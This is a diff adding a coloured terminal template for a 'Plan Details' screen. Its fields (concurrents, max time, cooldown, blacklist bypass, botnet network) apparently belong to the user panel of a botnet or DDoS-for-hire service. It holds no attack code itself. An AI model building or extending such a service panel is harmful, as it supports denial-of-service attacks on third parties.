@@ -1,0 +1,20 @@
+{clear}[8;24;80t[38;5;39m┌──────────────────────────────────────────────────────────────────────────────┐
+[38;5;39m│                            [97mPlan Details[38;5;39m:                                     │
+[38;5;39m└──────────────────────────────────────────────────────────────────────────────┘
+[38;5;39m  • [97mUsername:          [38;5;39m{user.username}
+[38;5;39m  • [97mRole:              [38;5;39m{user.role}
+[38;5;39m  • [97mAdmin:             [38;5;39m{user.admin}
+[38;5;39m  • [97mReseller:          [38;5;39m{user.reseller}
+[38;5;39m  • [97mVIP:               [38;5;39m{user.vip}
+[38;5;39m  • [97mExpiry:            [38;5;39m{user.expiry}
+[38;5;39m  • [97mMax Time:          [38;5;39m{user.maxTime}
+[38;5;39m  • [97mConcurrents:       [38;5;39m{user.concurrents}
+[38;5;39m  • [97mCooldown:          [38;5;39m{user.cooldown}
+[38;5;39m  • [97mAPI:               [38;5;39m{user.api}
+[38;5;39m  • [97mSpam Bypass:       [38;5;39m{user.spambypass}
+[38;5;39m  • [97mBlacklist Bypass:  [38;5;39m{user.blacklistbypass}
+[38;5;39m  • [97mHomeholder:        [38;5;39m{user.homeholder}
+[38;5;39m  • [97mBotnet Network:    [38;5;39m{user.botnet}
+[38;5;39m  • [97mBanned:            [38;5;39m{user.banned}
+[38;5;39m────────────────────────────────────────────────────────────────────────────────
+[97mUse [38;5;39m[97m"[38;5;39mhelp[97m"[97m for general commands or [38;5;39m[97m"[38;5;39mhome[97m"[97m to return to the main menu.
